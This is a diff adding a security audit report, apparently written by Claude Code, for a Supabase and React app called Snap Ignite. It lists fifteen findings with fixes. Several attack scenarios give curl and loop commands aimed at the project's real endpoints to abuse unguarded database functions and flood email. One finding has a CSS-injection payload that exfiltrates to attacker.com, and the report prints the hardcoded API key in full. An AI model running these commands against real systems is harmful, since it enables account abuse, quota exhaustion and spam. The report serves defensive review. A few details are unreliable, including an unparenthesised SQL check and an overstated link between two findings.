@@ -1,0 +1,546 @@
+# Snap Ignite — Deep Security Audit
+**Date:** 2026-02-21
+**Auditor:** Claude Code
+**Branch:** `claude/audit-production-readiness-CCNMG`
+**Scope:** Full codebase — edge functions, database RLS/functions, frontend, auth, payments, file upload
+
+---
+
+## Severity Legend
+
+| Level | Description |
+|-------|-------------|
+| 🔴 CRITICAL | Exploitable immediately; direct data breach, account takeover, or financial bypass |
+| 🟠 HIGH | Exploitable with low effort; significant data integrity or DoS risk |
+| 🟡 MEDIUM | Requires more effort or has limited blast radius; should be fixed pre-launch |
+| 🔵 LOW | Defense-in-depth issue; unlikely to be exploited but worth hardening |
+
+---
+
+## Summary
+
+| # | Severity | Area | Title |
+|---|----------|------|-------|
+| 1 | 🔴 CRITICAL | Database RPC | `fn_start_trial` missing `auth.uid()` guard — any user can start trials for others |
+| 2 | 🔴 CRITICAL | Database RPC | `fn_increment_trial_exports` missing `auth.uid()` guard — any user can drain others' exports |
+| 3 | 🟠 HIGH | Edge Function | `weekly-digest` has no authentication — unauthenticated mass email blast |
+| 4 | 🟠 HIGH | Edge Function | No rate limiting on any endpoint — brute force & abuse risk |
+| 5 | 🟠 HIGH | CORS | `Access-Control-Allow-Origin: *` on all state-mutating functions |
+| 6 | 🟡 MEDIUM | Edge Function | `delete-user-account` leaks full DB schema in error responses |
+| 7 | 🟡 MEDIUM | Edge Function | `backfill-scores` has no authentication at all (verify_jwt not in config = defaults to true, but worth confirming) |
+| 8 | 🟡 MEDIUM | Secrets | Hardcoded Supabase anon key and URL in source code |
+| 9 | 🟡 MEDIUM | XSS | `chart.tsx` `dangerouslySetInnerHTML` with partially user-influenced `id` prop |
+| 10 | 🟡 MEDIUM | Email | `weekly-digest` `from` address hardcoded to Lovable staging domain |
+| 11 | 🟡 MEDIUM | Auth | Role caching in `localStorage` without expiry — stale role data after role change |
+| 12 | 🔵 LOW | Auth | Dual password-reset paths create confusion; edge function requires active session |
+| 13 | 🔵 LOW | Secrets | Stripe error response reflects `tier_name` back to user verbatim |
+| 14 | 🔵 LOW | Database | Some SECURITY DEFINER functions lack explicit `SET search_path` |
+| 15 | 🔵 LOW | Dependencies | Mixed Deno std library versions across edge functions |
+
+---
+
+## Finding 1 — 🔴 CRITICAL: `fn_start_trial` accepts arbitrary `p_user_id`
+
+**File:** `supabase/migrations/20260215110000_update_trial_functions_for_stripe_trialing.sql:107`
+**Also called from:** `src/hooks/useTrialStatus.ts:84` (client-side Supabase RPC)
+
+### What's wrong
+
+`fn_start_trial` is a `SECURITY DEFINER` function granted to all `authenticated` users:
+
+```sql
+CREATE OR REPLACE FUNCTION public.fn_start_trial(
+  p_user_id uuid,   -- ← NO CHECK THAT THIS == auth.uid()
+  p_trial_tier text
+)
+RETURNS jsonb
+LANGUAGE plpgsql
+SECURITY DEFINER
+...
+GRANT EXECUTE ON FUNCTION public.fn_start_trial(uuid, text) TO authenticated;
+```
+
+There is no `IF p_user_id != auth.uid() THEN RAISE EXCEPTION` guard.
+
+### Attack scenario
+
+1. Attacker signs up for a free Snap Ignite account.
+2. Attacker enumerates or discovers another user's UUID (user IDs are exposed in the `profiles` table via any SELECT that joins on `user_id`, or visible in their own JWT subject).
+3. Attacker calls directly (bypassing the React frontend):
+   ```bash
+   curl -X POST https://ojyxblegxpdgaqiscxpz.supabase.co/rest/v1/rpc/fn_start_trial \
+     -H "Authorization: Bearer <attacker_jwt>" \
+     -H "apikey: <anon_key>" \
+     -H "Content-Type: application/json" \
+     -d '{"p_user_id": "<victim_uuid>", "p_trial_tier": "enterprise"}'
+   ```
+4. A `user_subscriptions` row with `status = 'trial'` and `trial_tier = 'enterprise'` is inserted for the victim — bypassing the RLS policy that says only the service role can write to `user_subscriptions`.
+5. The victim now has an unwanted trial that burns through their one-time trial allowance.
+
+More critically: because `fn_start_trial` is `SECURITY DEFINER`, it runs as the function owner (typically `postgres`/superuser) and bypasses the RLS policy `"Service role manages subscriptions"`. **Any authenticated user can insert rows into `user_subscriptions` for any other user.**
+
+### Fix
+
+Add a caller-identity guard at the start of the function body:
+
+```sql
+IF p_user_id != auth.uid() THEN
+  RAISE EXCEPTION 'Permission denied: cannot start trial for another user';
+END IF;
+```
+
+---
+
+## Finding 2 — 🔴 CRITICAL: `fn_increment_trial_exports` accepts arbitrary `p_user_id`
+
+**File:** `supabase/migrations/20260215024335_3affae74-8aea-4c35-901f-d3f6a498b9cf.sql`
+**Also called from:** `src/hooks/useTrialStatus.ts:108` (client-side) and `supabase/functions/export-csv/index.ts:273` (server-side)
+
+### What's wrong
+
+Same pattern as Finding 1. `fn_increment_trial_exports(p_user_id uuid, p_count integer)` is `SECURITY DEFINER`, granted to `authenticated`, with no `auth.uid()` check.
+
+### Attack scenario
+
+1. Attacker calls:
+   ```bash
+   curl -X POST .../rpc/fn_increment_trial_exports \
+     -d '{"p_user_id": "<victim_uuid>", "p_count": 50}'
+   ```
+2. The victim's `trial_exports_used` is incremented by 50 — exhausting their trial quota without them exporting anything.
+3. The victim's trial effectively becomes non-functional.
+
+This is a targeted denial-of-service against any trial user.
+
+### Fix
+
+```sql
+IF p_user_id != auth.uid() THEN
+  RAISE EXCEPTION 'Permission denied';
+END IF;
+```
+
+Note: the server-side call in `export-csv` uses the anon key with the user's JWT, so `auth.uid()` will correctly resolve to the exporting user. Adding this guard does not break the server-side flow.
+
+---
+
+## Finding 3 — 🟠 HIGH: `weekly-digest` Has No Authentication
+
+**File:** `supabase/functions/weekly-digest/index.ts`
+**Config:** `supabase/config.toml` — `verify_jwt = false`
+
+### What's wrong
+
+The `weekly-digest` function:
+1. Has `verify_jwt = false` in config (Supabase does not require a JWT)
+2. Has **zero authentication logic** in the function body — no Bearer token check, no `x-internal-secret` header check, no cron-key validation
+
+Any HTTP request to the function URL triggers:
+- Fetching **all user emails** from `auth.admin.listUsers()` (via the service role key)
+- Sending a Resend email to **every subscribed user**
+
+### Attack scenario
+
+```bash
+# Unauthenticated attacker spams the endpoint
+for i in $(seq 1 100); do
+  curl -X POST https://ojyxblegxpdgaqiscxpz.supabase.co/functions/v1/weekly-digest &
+done
+```
+
+Result: Hundreds of emails sent to every user, Resend daily quota exhausted, users mark email as spam destroying deliverability. Resend rate limits would throttle individual sends but not the repeated function invocations.
+
+Compare to other `verify_jwt = false` functions (`backfill-insights`, `refresh-outdated-insights`, `reverse-geocode-zips`), which all implement their own `x-internal-secret === SUPABASE_SERVICE_ROLE_KEY` guard.
+
+### Fix
+
+Add the same internal-secret guard used by the other admin functions:
+
+```typescript
+const internalSecret = req.headers.get('x-internal-secret');
+const isInternalCall = internalSecret === Deno.env.get("SUPABASE_SERVICE_ROLE_KEY");
+if (!isInternalCall) {
+  return new Response(JSON.stringify({ error: 'Unauthorized' }), { status: 401 });
+}
+```
+
+Alternatively, change `verify_jwt = true` and require an admin JWT.
+
+---
+
+## Finding 4 — 🟠 HIGH: No Rate Limiting on Any Edge Function
+
+**Files:** All `supabase/functions/*/index.ts`
+
+### What's wrong
+
+No edge function implements rate limiting. The most sensitive ones:
+
+- **`create-checkout-session`** — Can be called in a loop to probe valid Stripe price IDs or create many Stripe customers (Stripe charges for customer objects in some configurations).
+- **`send-password-reset`** — Can be used to spam password reset emails to any user who is currently logged in.
+- **`send-support-message`** — No limit on message volume; attacker could flood `support@snapignite.com`.
+- **`export-csv`** — Subscription limit prevents export overuse, but still subject to abuse at the function invocation level.
+
+### Attack scenario (send-password-reset)
+
+Attacker logs in as themselves, then in a loop:
+```javascript
+for (let i = 0; i < 1000; i++) {
+  supabase.functions.invoke('send-password-reset');
+}
+```
+Result: 1,000 password reset emails sent to the attacker's own address — or if combined with Finding 2 (p_user_id spoofing), to any victim.
+
+### Fix
+
+Implement per-user rate limiting using Supabase's built-in `leaky_bucket` approach or a simple insert into a rate-limit table. For the most critical endpoints, add a `X-RateLimit-*` response header and check invocation frequency. A minimal pattern:
+
+```typescript
+const { count } = await supabase
+  .from('rate_limit_log')
+  .select('*', { count: 'exact', head: true })
+  .eq('user_id', user.id)
+  .eq('action', 'password_reset')
+  .gte('created_at', new Date(Date.now() - 60_000).toISOString());
+
+if ((count ?? 0) >= 3) {
+  return new Response(JSON.stringify({ error: 'Too many requests' }), { status: 429 });
+}
+```
+
+---
+
+## Finding 5 — 🟠 HIGH: `Access-Control-Allow-Origin: *` on All State-Mutating Functions
+
+**Files:** All `supabase/functions/*/index.ts` — all set `"Access-Control-Allow-Origin": "*"`
+
+### What's wrong
+
+Every edge function, including ones that mutate state (`export-csv`, `delete-user-account`, `create-checkout-session`, `send-support-message`), responds with:
+
+```
+Access-Control-Allow-Origin: *
+```
+
+This allows any website in the world to make credentialed cross-origin requests to these endpoints. While the `Authorization: Bearer` header requirement provides some mitigation (simple CORS requests can't send custom headers), it does not protect against:
+
+1. **Stored XSS on a third-party site** that reads the user's Supabase session from localStorage and sends it in a request
+2. **Malicious browser extensions** with broad permissions
+3. **Subdomain takeover** — if any `*.snapignite.com` subdomain is taken over, it can freely call all APIs
+
+For comparison: the Supabase anon key is hardcoded in the source (Finding 8) and exposed in the built JS bundle, meaning an attacker has the API key + a user's JWT token from a compromised context and can call any endpoint.
+
+### Fix
+
+Restrict the `Access-Control-Allow-Origin` to the production domain:
+
+```typescript
+const allowedOrigins = ['https://snapignite.com', 'https://www.snapignite.com'];
+
+const corsHeaders = {
+  "Access-Control-Allow-Origin": allowedOrigins.includes(req.headers.get("origin") ?? '')
+    ? req.headers.get("origin")!
+    : allowedOrigins[0],
+  ...
+};
+```
+
+For functions that should only be called server-to-server (like `backfill-*`, `weekly-digest`, `reverse-geocode-zips`), remove CORS headers entirely.
+
+---
+
+## Finding 6 — 🟡 MEDIUM: `delete-user-account` Leaks Database Schema
+
+**File:** `supabase/functions/delete-user-account/index.ts:107-112`
+
+### What's wrong
+
+On success, the function returns the full `deletionResults` array:
+
+```typescript
+return new Response(
+  JSON.stringify({
+    success: true,
+    message: "Account deleted successfully",
+    deletionResults   // ← includes every table name and error messages
+  }),
+  ...
+);
+```
+
+`deletionResults` contains entries like:
+```json
+[
+  { "table": "lead_lists", "success": true },
+  { "table": "user_roles", "success": true },
+  { "table": "upload_jobs", "success": false, "error": "foreign key violation on table properties_id" }
+]
+```
+
+This reveals the full database schema to any user who deletes their account, including internal table names and constraint names that could aid in crafting injection attacks or understanding data relationships.
+
+### Fix
+
+Return only the success/failure status, not the detailed table-by-table results. Log `deletionResults` server-side only.
+
+---
+
+## Finding 7 — 🟡 MEDIUM: `backfill-scores` Verify_JWT Status Unclear
+
+**File:** `supabase/functions/backfill-scores/index.ts`
+**Config:** `backfill-scores` is NOT listed in `supabase/config.toml` with explicit `verify_jwt` setting
+
+### What's wrong
+
+`backfill-scores` is not present in `config.toml`. Supabase defaults to `verify_jwt = true` for unlisted functions, **but** the function body itself has no authentication code — it only checks for the presence of env vars, then immediately begins processing:
+
+```typescript
+// Line 29 — immediately reads body, no auth check
+const { autoResume = true, batchSize = BATCH_SIZE } = await req.json().catch(() => ({}));
+```
+
+If the `config.toml` entry is missing due to an oversight, this function processes all unscored properties and self-invokes repeatedly with the service role key — a privileged operation with no explicit access control layer.
+
+### Action
+
+Confirm `backfill-scores` has `verify_jwt = true` in `config.toml` and add an explicit admin/internal-secret check to the function body as defense-in-depth.
+
+---
+
+## Finding 8 — 🟡 MEDIUM: Hardcoded Supabase Credentials in Source
+
+**File:** `src/integrations/supabase/externalClient.ts:17-22`
+
+### What's wrong
+
+```typescript
+const SUPABASE_KEY =
+  import.meta.env.VITE_SUPABASE_PUBLISHABLE_KEY ||
+  import.meta.env.VITE_EXTERNAL_SUPABASE_ANON_KEY ||
+  'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im9qeXhibGVneHBkZ2FxaXNjeHB6Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTgzMTQ5NTMsImV4cCI6MjA3Mzg5MDk1M30.r9TsZsdtHiYVyyNXpeKB8iHumb3ZZfdDUHN4g8twGrU';
+```
+
+And similarly the production Supabase URL `https://ojyxblegxpdgaqiscxpz.supabase.co` is hardcoded.
+
+The anon key is intentionally public (it's the client-facing Supabase key protected by RLS). However:
+
+1. **It is now committed to git history** — if the key ever needs to be rotated, every git clone will still have the old key
+2. **It permanently ties the codebase to this Supabase project** — moving projects requires a code change, not just an env var update
+3. **The fallback will silently activate** if env vars are not set at build time, making deployment issues invisible
+
+### Fix
+
+Remove the hardcoded fallback strings. If env vars are not set, fail loudly at startup:
+
+```typescript
+const SUPABASE_KEY = import.meta.env.VITE_SUPABASE_PUBLISHABLE_KEY
+  || import.meta.env.VITE_EXTERNAL_SUPABASE_ANON_KEY;
+
+if (!SUPABASE_URL || !SUPABASE_KEY) {
+  throw new Error('[externalClient] VITE_SUPABASE_URL and VITE_SUPABASE_PUBLISHABLE_KEY must be set');
+}
+```
+
+---
+
+## Finding 9 — 🟡 MEDIUM: `dangerouslySetInnerHTML` CSS Injection in Chart Component
+
+**File:** `src/components/ui/chart.tsx:70-71`
+
+### What's wrong
+
+```tsx
+<style
+  dangerouslySetInnerHTML={{
+    __html: Object.entries(THEMES)
+      .map(([theme, prefix]) => `
+${prefix} [data-chart=${id}] {
+${colorConfig.map(([key, itemConfig]) => {
+  const color = itemConfig.theme?.[theme] || itemConfig.color;
+  return color ? `  --color-${key}: ${color};` : null;
+}).join("\n")}
+}`)
+      .join("\n"),
+  }}
+/>
+```
+
+The `id` prop is interpolated directly into a CSS selector without escaping or allowlisting. If an attacker can control the `id` prop value, they can inject arbitrary CSS:
+
+**Attack payload for `id`:** `x] { } @import url(https://attacker.com/steal?c=`
+
+This is a CSS injection that can exfiltrate sensitive data visible on the page.
+
+**Is `id` user-controlled?** Trace the call chain: `ChartContainer` receives `id` as a prop. Check where charts are instantiated and whether any chart `id` value comes from user-supplied data (e.g., list names, property addresses, jurisdiction names).
+
+### Fix
+
+Sanitize the `id` before using it in the CSS template:
+
+```typescript
+const safeId = id.replace(/[^a-zA-Z0-9-_]/g, '_');
+```
+
+Or use CSS.escape if available in the Deno/browser environment.
+
+---
+
+## Finding 10 — 🟡 MEDIUM: `weekly-digest` Hardcoded Lovable `from` Address
+
+**File:** `supabase/functions/weekly-digest/index.ts:261`
+
+```typescript
+from: "Snap Ignite <digest@ignite-snap-leads.lovable.app>",
+```
+
+This is a staging domain. Emails sent from this address will fail DMARC alignment for `snapignite.com` and are likely to be flagged as spam or rejected by major email providers.
+
+(Also noted in the production readiness audit — included here because it is also a security concern for email deliverability trust and domain reputation.)
+
+### Fix
+
+Change to `"Snap Ignite <digest@snapignite.com>"` and authorize this sender in Resend.
+
+---
+
+## Finding 11 — 🟡 MEDIUM: Role Cache in `localStorage` Has No Expiry
+
+**File:** `src/hooks/use-auth.ts` (role caching logic) and `src/components/auth/RoleProtectedRoute.tsx`
+
+### What's wrong
+
+The role check caches results to `localStorage` to avoid repeated DB roundtrips on page load. However, the cached role has no expiry time. If an admin revokes a user's admin role in the database:
+
+1. The user's cached `localStorage` role still shows `admin`
+2. On page reload, the cache is used immediately — the user sees the admin UI
+3. The DB check happens asynchronously and eventually corrects the state — but there is a window (varies by connection speed, typically 1-3 seconds) where the revoked admin can attempt privileged client-side actions
+
+**Is this actually exploitable?** The edge functions independently verify admin role on every request, so server-side operations are safe. The risk is limited to client-side gating (e.g., rendering admin-only UI components). But cached stale roles can give a false sense of security.
+
+### Fix
+
+Add a TTL to the localStorage cache (e.g., 5 minutes), and/or store the timestamp of when the role was fetched and invalidate if older than N minutes:
+
+```typescript
+const ROLE_CACHE_TTL_MS = 5 * 60 * 1000;
+const cached = localStorage.getItem('snap_user_role');
+const cachedAt = localStorage.getItem('snap_user_role_at');
+if (cached && cachedAt && Date.now() - Number(cachedAt) < ROLE_CACHE_TTL_MS) {
+  return cached; // still fresh
+}
+```
+
+---
+
+## Finding 12 — 🔵 LOW: Dual Password Reset Paths Cause UX Confusion
+
+**Files:**
+- `src/hooks/use-auth.ts:324` — uses `supabase.auth.resetPasswordForEmail` (works without session)
+- `src/hooks/useProfileSettings.ts:123` — invokes `send-password-reset` edge function (requires active session)
+
+The `send-password-reset` edge function requires an active JWT. This means it only works for users who are **already logged in** and want to change their password from Settings. A user who forgot their password and is not logged in cannot use this path.
+
+The unauthenticated reset path uses Supabase's native `resetPasswordForEmail`. This is fine, but the two paths using different email senders (Supabase native SMTP vs Resend) may produce inconsistently styled emails and different sending addresses.
+
+### Fix
+
+Audit which Supabase SMTP settings are configured so that the native reset email also comes from `noreply@snapignite.com`. Alternatively, gate the Settings "Change Password" flow on the `send-password-reset` edge function, and ensure the Auth page uses Supabase native reset (which does not require a session).
+
+---
+
+## Finding 13 — 🔵 LOW: `create-checkout-session` Reflects `tier_name` in Error
+
+**File:** `supabase/functions/create-checkout-session/index.ts:85-88`
+
+```typescript
+if (!priceId) {
+  return new Response(
+    JSON.stringify({ error: `Unknown plan: ${tier_name}` }),
+    { status: 400, headers }
+  );
+}
+```
+
+The user-supplied `tier_name` is reflected verbatim in the error response. While this is a minor information disclosure (no XSS risk in a JSON response), it confirms to an attacker that their supplied value was processed and can be used for plan-name enumeration.
+
+### Fix
+
+Return a generic message: `"Invalid plan selection"` without echoing back the input.
+
+---
+
+## Finding 14 — 🔵 LOW: SECURITY DEFINER Functions Without `SET search_path`
+
+**Files:** Multiple migration files
+
+Some `SECURITY DEFINER` functions do not include `SET search_path = public`. This is relevant because without an explicit `search_path`, a malicious user with the ability to create objects in a schema searched before `public` could potentially cause schema confusion (a type of privilege escalation known as a search path attack).
+
+The well-written functions (e.g., `fn_start_trial`, `fn_increment_trial_exports`) already have `SET search_path = public`. Audit all remaining `SECURITY DEFINER` functions and ensure they all include this clause.
+
+### Check with:
+
+```sql
+SELECT proname, prosrc
+FROM pg_proc
+WHERE prosecdef = true
+  AND proconfig IS NULL OR NOT (proconfig @> ARRAY['search_path=public']);
+```
+
+---
+
+## Finding 15 — 🔵 LOW: Mixed Deno Standard Library Versions
+
+**Files:** Various edge functions
+
+```
+deno.land/std@0.168.0/http/server.ts  — backfill-*, refresh-*, reverse-geocode-zips, scheduled-rescore, geocode-properties
+deno.land/std@0.190.0/http/server.ts  — send-support-message, weekly-digest, send-password-reset, send-user-invitation
+```
+
+Different versions of `deno.land/std` can have different behavior and security patches. Functions on `0.168.0` may be missing security fixes present in `0.190.0`.
+
+### Fix
+
+Standardize all functions to use the same (latest stable) Deno std version. Pin via `supabase/functions/deno.json` import map.
+
+---
+
+## Summary: What Needs Fixing Before Launch
+
+### Immediate (pre-launch blockers):
+
+1. **Add `auth.uid()` check to `fn_start_trial`** — prevents unauthorized trial creation for other users
+2. **Add `auth.uid()` check to `fn_increment_trial_exports`** — prevents targeted export quota exhaustion against other users
+3. **Add authentication to `weekly-digest`** — prevents unauthenticated mass email spam
+
+### Short-term (fix within first week):
+
+4. Add rate limiting to `send-password-reset`, `send-support-message`, and `create-checkout-session`
+5. Restrict `Access-Control-Allow-Origin` to the production domain
+6. Strip `deletionResults` from `delete-user-account` response
+7. Fix weekly-digest `from` address to `digest@snapignite.com`
+8. Remove hardcoded Supabase credentials from `externalClient.ts`
+
+### Backlog (harden over time):
+
+9. Sanitize chart `id` before CSS template interpolation
+10. Add TTL to localStorage role cache
+11. Standardize Deno std library version across all functions
+12. Add `SET search_path = public` to any remaining SECURITY DEFINER functions without it
+
+---
+
+## Positive Security Notes
+
+These were done correctly and should be maintained:
+
+- ✅ Stripe webhook uses `constructEventAsync` with raw body — signature verification is correct
+- ✅ `user_subscriptions` write access is restricted to service role via `"Service role manages subscriptions"` RLS policy
+- ✅ `user_roles` INSERT/UPDATE/DELETE is restricted to admins only via `has_role(auth.uid(), 'admin')` check
+- ✅ `fn_start_trial` prevents multiple trials with `trial_started_at IS NOT NULL` check
+- ✅ Export limits are enforced server-side in both the edge function and the DB function (dual enforcement)
+- ✅ Password reset `redirectTo` URL uses server-controlled `APP_URL` env var, not user input (no open redirect)
+- ✅ `send-support-message` properly escapes HTML entities in user message content (`replace(/</g, "&lt;")`)
+- ✅ File upload has server-side size limit enforcement (`MAX_FILE_SIZE_MB`)
+- ✅ Admin-only functions (`backfill-insights`, `bulk-generate-missing-insights`, `refresh-outdated-insights`) implement the `x-internal-secret` pattern correctly
+- ✅ `delete-user-account` correctly scopes deletion to the authenticated user's UUID from JWT, not from request body
